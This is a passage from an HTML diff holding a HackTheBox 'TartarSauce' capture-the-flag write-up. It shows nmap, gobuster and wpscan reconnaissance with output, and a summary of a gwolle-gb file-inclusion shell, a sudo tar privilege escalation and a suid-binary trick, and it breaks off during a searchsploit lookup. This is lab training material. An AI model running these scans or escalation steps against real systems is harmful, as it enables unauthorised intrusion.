@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox TartarSauce</strong></h1>
+        <em>Released: 12th May 2018 / Pwned: 28th October 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        The creator of TartarSauce is a massive troll.<br>
+        Sometimes that can be fun, but here it's a little obnoxious (not in a good way) :/<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Run gobuster to find a WordPress install<br>
+        • Use wpscan and aggressively scan for plugins<br>
+        • Read the changelog of gwolle-gb to find that you're being trolled about the plugin version<br>
+        • Exploit gwolle-gb to get a shell on the system<br>
+        • Check sudo privileges, and priv-esc to onuma with tar command execution<br>
+        • Run pspy or check the system timers<br>
+        • Exploit /usr/sbin/backuperer by replacing the hidden gzip archive it creates with one that contains a suid binary<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.88</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p 80 -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.88</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.88</span><br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http<br>
+                <br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>horace<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;80&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open.txt&nbsp;10.10.10.88</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                80<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">((</span>Ubuntu<span style="color:#ff9d00;font-weight:700">))</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_&nbsp;&nbsp;Supported&nbsp;Methods<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;GET&nbsp;HEAD&nbsp;POST&nbsp;OPTIONS<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;http-robots.txt<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;5&nbsp;disallowed&nbsp;entries&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/tar/tar/</span>source<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>monstra-3.0.4<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>easy-file-uploader<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>developmental<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>phpmyadmin<span style="color:#ff9d00;font-weight:700">/</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Apache<span style="color:#ff9d00;font-weight:700">/</span>2.4.18&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Ubuntu<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Landing&nbsp;Page<br>
+                Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Aggressive&nbsp;OS&nbsp;guesses<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Linux&nbsp;3.2&nbsp;-&nbsp;4.9&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>95%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Linux&nbsp;3.16&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>95%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;ASUS&nbsp;RT-N56U&nbsp;WAP&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Linux&nbsp;3.4<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>95%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Linux&nbsp;3.18&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>94%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Linux&nbsp;3.1&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>93%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Linux&nbsp;3.2&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>93%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Linux&nbsp;3.10&nbsp;-&nbsp;4.11&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>93%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Oracle&nbsp;VM&nbsp;Server&nbsp;3.4.2&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Linux&nbsp;4.1<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>93%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Linux&nbsp;3.12&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>93%<span style="color:#ff9d00;font-weight:700">)</span>,&nbsp;Linux&nbsp;3.13&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>93%<span style="color:#ff9d00;font-weight:700">)</span><br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Analysis:<br>
+        • Only 1 port - 80/http. Nmap found some entries in robots.txt, but all of these are rabbit holes<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2) 80/http - Gobuster</strong></h3><br>
+        After going down the rabbit hole of <code>/webservices</code>, directory brute force the web site with gobuster.<br>
+        <br>
+        A brute force of <code>/webservices</code> reveals a <code>/wp</code> directory. WordPress is running.<br>
+            <div class="codebox">
+                ┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#gobuster&nbsp;dir&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.88/webservices/&nbsp;-w&nbsp;/usr/share/wordlists/seclists/Discovery/Web-Content/big.txt&nbsp;-o&nbsp;gb1.txt</span><br>
+                ===============================================================<br>
+                Gobuster&nbsp;v3.0.1<br>
+                by&nbsp;OJ&nbsp;Reeves&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@TheColonial<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;</span>&nbsp;Christian&nbsp;Mehlmauer&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>@_FireFart_<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ===============================================================<br>
+                [+]&nbsp;Url<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span><br>
+                [+]&nbsp;Threads<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<br>
+                [+]&nbsp;Wordlist<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>seclists<span style="color:#ff9d00;font-weight:700">/</span>Discovery<span style="color:#ff9d00;font-weight:700">/</span>Web-Content<span style="color:#ff9d00;font-weight:700">/</span>big.txt<br>
+                [+]&nbsp;Status&nbsp;codes<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;200,204,301,302,307,401,403<br>
+                [+]&nbsp;User&nbsp;Agent<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gobuster<span style="color:#ff9d00;font-weight:700">/</span>3.0.1<br>
+                [+]&nbsp;Expanded<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">true</span><br>
+                [+]&nbsp;Timeout<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10s<br>
+                ===============================================================<br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>.htpasswd&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>.htaccess&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;403<span style="color:#ff9d00;font-weight:700">)</span><br>
+                http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Status<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;301<span style="color:#ff9d00;font-weight:700">)</span><br>
+                ===============================================================
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>2a) wpscan</strong></h3><br>
+        The WordPress site <code>http://10.10.10.88/webservices/wp</code> is pretty broken.<br>
+        <code>wpscan</code> the site. Initially you wont find anything, but aggressively enumerate for plugins with <code>--plugins-detection aggressive</code> and you'll find some plugins: <code>akismet</code>, <code>brute-force-login-protection</code>, and <code>gwolle-gb</code>.<br>
+        <br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#wpscan&nbsp;--url&nbsp;http://10.10.10.88/webservices/wp&nbsp;-e&nbsp;ap</span><br>
+                [...]<br>
+                ─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>tartarsauce<span style="color:#ff9d00;font-weight:700">/</span>http]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#wpscan&nbsp;--url&nbsp;http://10.10.10.88/webservices/wp&nbsp;-e&nbsp;ap&nbsp;--plugins-detection&nbsp;aggressive</span><br>
+                [...]<br>
+                <br>
+                [+]&nbsp;Enumerating&nbsp;All&nbsp;Plugins&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>via&nbsp;Aggressive&nbsp;Methods<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;Checking&nbsp;Known&nbsp;Locations&nbsp;-&nbsp;Time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>16<span style="color:#ff9d00;font-weight:700">:</span>21&nbsp;&lt;==========================================================================================================&gt;&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>83168&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;83168<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;100.00%&nbsp;Time<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>16<span style="color:#ff9d00;font-weight:700">:</span>21<br>
+                [+]&nbsp;Checking&nbsp;Plugin&nbsp;Versions&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>via&nbsp;Passive&nbsp;and&nbsp;Aggressive&nbsp;Methods<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                [i]&nbsp;Plugin<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;Identified<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <br>
+                [+]&nbsp;akismet<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Location<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>akismet<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Last&nbsp;Updated<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2019-05-14T15<span style="color:#ff9d00;font-weight:700">:</span>05<span style="color:#ff9d00;font-weight:700">:</span>00.000Z<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Readme<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>akismet<span style="color:#ff9d00;font-weight:700">/</span>readme.txt<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;[<span style="color:#ff9d00;font-weight:700">!</span>]&nbsp;The&nbsp;version&nbsp;is&nbsp;out&nbsp;of&nbsp;<span style="color:#ff9d00;font-weight:700">date</span>,&nbsp;the&nbsp;latest&nbsp;version&nbsp;is&nbsp;4.1.2<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Detected&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Known&nbsp;Locations&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;4.0.3&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>100%&nbsp;confidence<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Detected&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Readme&nbsp;-&nbsp;Stable&nbsp;Tag&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;-&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>akismet<span style="color:#ff9d00;font-weight:700">/</span>readme.txt<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Confirmed&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Readme&nbsp;-&nbsp;ChangeLog&nbsp;Section&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;-&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>akismet<span style="color:#ff9d00;font-weight:700">/</span>readme.txt<br>
+                <br>
+                [+]&nbsp;brute-force-login-protection<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Location<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>brute-force-login-protection<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Latest&nbsp;Version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1.5.3&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>up&nbsp;to&nbsp;<span style="color:#ff9d00;font-weight:700">date)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Last&nbsp;Updated<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2017-06-29T10<span style="color:#ff9d00;font-weight:700">:</span>39<span style="color:#ff9d00;font-weight:700">:</span>00.000Z<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Readme<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>brute-force-login-protection<span style="color:#ff9d00;font-weight:700">/</span>readme.txt<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Detected&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Known&nbsp;Locations&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;1.5.3&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>100%&nbsp;confidence<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Detected&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Readme&nbsp;-&nbsp;Stable&nbsp;Tag&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;-&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>brute-force-login-protection<span style="color:#ff9d00;font-weight:700">/</span>readme.txt<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Confirmed&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Readme&nbsp;-&nbsp;ChangeLog&nbsp;Section&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;-&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>brute-force-login-protection<span style="color:#ff9d00;font-weight:700">/</span>readme.txt<br>
+                <br>
+                [+]&nbsp;gwolle-gb<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Location<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>gwolle-gb<span style="color:#ff9d00;font-weight:700">/</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Last&nbsp;Updated<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2019-08-21T10<span style="color:#ff9d00;font-weight:700">:</span>17<span style="color:#ff9d00;font-weight:700">:</span>00.000Z<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Readme<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>gwolle-gb<span style="color:#ff9d00;font-weight:700">/</span>readme.txt<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;[<span style="color:#ff9d00;font-weight:700">!</span>]&nbsp;The&nbsp;version&nbsp;is&nbsp;out&nbsp;of&nbsp;<span style="color:#ff9d00;font-weight:700">date</span>,&nbsp;the&nbsp;latest&nbsp;version&nbsp;is&nbsp;3.1.6<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Detected&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Known&nbsp;Locations&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Version<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;2.3.10&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>100%&nbsp;confidence<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Detected&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Readme&nbsp;-&nbsp;Stable&nbsp;Tag&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;-&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>gwolle-gb<span style="color:#ff9d00;font-weight:700">/</span>readme.txt<br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;Confirmed&nbsp;By<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Readme&nbsp;-&nbsp;ChangeLog&nbsp;Section&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Aggressive&nbsp;Detection<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;-&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.10.88<span style="color:#ff9d00;font-weight:700">/</span>webservices<span style="color:#ff9d00;font-weight:700">/</span>wp<span style="color:#ff9d00;font-weight:700">/</span>wp-content<span style="color:#ff9d00;font-weight:700">/</span>plugins<span style="color:#ff9d00;font-weight:700">/</span>gwolle-gb<span style="color:#ff9d00;font-weight:700">/</span>readme.txt<br>
+                <br>
+                [<span style="color:#ff9d00;font-weight:700">!</span>]&nbsp;No&nbsp;WPVulnDB&nbsp;API&nbsp;Token&nbsp;given,&nbsp;as&nbsp;a&nbsp;result&nbsp;vulnerability&nbsp;data&nbsp;has&nbsp;not&nbsp;been&nbsp;output.<br>
+                [<span style="color:#ff9d00;font-weight:700">!</span>]&nbsp;You&nbsp;can&nbsp;get&nbsp;a&nbsp;<span style="color:#ff9d00;font-weight:700">free</span>&nbsp;API&nbsp;token&nbsp;with&nbsp;50&nbsp;daily&nbsp;requests&nbsp;by&nbsp;registering&nbsp;at&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>wpvulndb.com<span style="color:#ff9d00;font-weight:700">/</span>users<span style="color:#ff9d00;font-weight:700">/</span>sign_up.
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>2b) gwolle-gb</strong></h3><br>
+        <code>gwolle-gb</code> version 1.5.3 has an RFI vulnerability.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#searchsploit&nbsp;gwolle</span><br>
+                <br>
+                Exploit&nbsp;Title&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/)</span><br>
+                ----------------------------------------------------&nbsp;----------------------------------------<br>
